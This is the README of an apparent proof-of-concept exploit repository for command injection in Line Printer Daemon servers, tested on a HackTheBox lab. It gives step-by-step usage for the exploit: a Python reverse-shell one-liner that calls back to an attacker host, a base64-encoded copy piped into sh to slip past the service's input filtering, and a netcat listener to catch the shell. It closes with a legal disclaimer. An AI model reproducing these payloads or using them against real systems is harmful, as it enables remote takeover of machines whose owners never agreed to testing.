# Digital-Archiving-Solutions-v1.02-Remote-Code-Execution-POC

Tested on: **HackTheBox: Paperwork**

# LPD Command Injection Exploit

A Python-based proof-of-concept exploit script designed to test Line Printer Daemon (LPD) servers for command injection vulnerabilities via malformed control file job names.

---

## 📌 Overview

This script interacts with an LPD service (typically running on port 515 or custom ports like 1515) by initiating a print job request, supplying a valid queue name, and injecting an OS command into the control file's job name (`J`) directive. If the remote service improperly sanitizes this input when processing print jobs or logging, it can lead to arbitrary command execution.

---

## ⚙️ Requirements

* **Python:** Python 3.x
* **Dependencies:** Uses standard Python libraries only (`socket`, `sys`, `argparse`). No external packages are required.

---

## 🚀 Usage

Run the script from the command line by providing the target host, a valid printer queue, and the command you wish to execute.

### Command-Line Arguments

| Argument | Flag | Description | Default | Required |
| :--- | :--- | :--- | :--- | :--- |
| `host` | *None* | Target server IP address or domain name. | *N/A* | **Yes** |
| `--port` | `-p` | Target LPD service port. | `1515` | No |
| `--queue` | `-q` | Valid target printer queue name on the remote server. | *N/A* | **Yes** |
| `--command` | `-c` | The shell command to execute on the target. | *N/A* | **Yes** |

---

## 📖 Practical Example (Base64 Bypass)

When injecting reverse shells into target strings, special characters (like quotes, backslashes, and ampersands) can easily break the backend terminal logic. 

To ensure complete reliability, you can convert your entire reverse shell payload into a safe **Base64 string**, send it through the `-c` argument, and decode it directly on the target machine.

### 1. Encode your reverse shell payload
```bash
echo -n "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER-IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'" | base64
```

### 2. Run the Exploit Script
Pass the base64 string to the target environment (`TARGET`) where it will automatically decode and pipeline straight into the shell interpreter (`sh`):

```bash
python3 poc.py TARGET_IP -p 1515 -q TARGET_QUEUE -c "echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjI3Iiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJwo= | base64 -d | sh"
```

### 3. Catch the Shell
Make sure your local Netcat listener is running on your specified workstation port before executing the script above:
```bash
nc -lvnp 4444
```

## ⚠️ Legal Disclaimer

The code, techniques, and materials provided in this repository are for **educational purposes, security research, and authorized penetration testing only**. 

* **Authorized Testing Only:** This exploit script is explicitly designed for use in controlled lab environments (HackTheBox Paperwork Lab) or against target assets where you have explicit, written authorization from the owner.
* **Liability:** The author assumes absolutely no liability or responsibility for any misuse, damage, or legal consequences resulting from the use or modifications of this script. 
* **Malicious Intent:** Running this tool against production networks or unauthorized targets is illegal and punishable under cybersecurity laws worldwide.

By cloning or executing this script, you agree to take full legal responsibility for your actions.
